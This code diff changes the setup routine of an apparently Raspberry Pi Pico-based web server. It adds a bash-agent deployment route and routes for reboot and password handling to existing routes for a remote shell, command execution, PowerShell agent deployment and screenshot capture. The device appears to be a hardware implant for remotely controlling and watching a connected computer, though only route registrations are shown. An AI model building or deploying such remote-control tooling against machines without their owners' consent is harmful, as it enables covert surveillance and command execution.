@@ -16,7 +16,6 @@
 #include "webfunctions.h"
 #include "webfiles.h"
 #include "screen.h"
-
 #include "hardware/watchdog.h"
 #include "pico/stdlib.h"
 
@@ -63,12 +62,16 @@ void setup() {
     server.on("/shell", HTTP_GET, handleShell);
     routeWithLog("/execute", HTTP_POST, handleExecuteCommand, "[SVR] Command Executed");
     routeWithLog("/deploy", HTTP_POST, handlePsAgent, "[SVR] PS Agent Started");
+    routeWithLog("/deploy_linux", HTTP_POST, handleLinuxAgent, "[SVR] Bash Agent Started");
     server.on("/screen", HTTP_GET, handleScreenPage);
     routeWithLog("/take-screenshot", HTTP_POST, handleTakeScreenshot, "[SVR] Screenshot");
     server.on("/get-screenshot", HTTP_GET, handleGetScreenshot);
     routeWithLog("/deploy-screenshot", HTTP_POST, handleSSAgent, "[SVR] SS Agent Started");
     server.on("/screenshot.jpg", HTTP_GET, handleSavedScreenshot);
     routeWithLog("/exit-agent", HTTP_POST, handleExitAgent, "[SVR] Exiting Agent");
+    server.on("/reboot_pico", HTTP_POST, restartPico);
+    server.on("/update_password", HTTP_POST, handleUpdatePassword);
+    server.on("/get_password", HTTP_GET, handleGetPassword);
     
     server.begin();
     Serial.println("HTTP Server Started.");
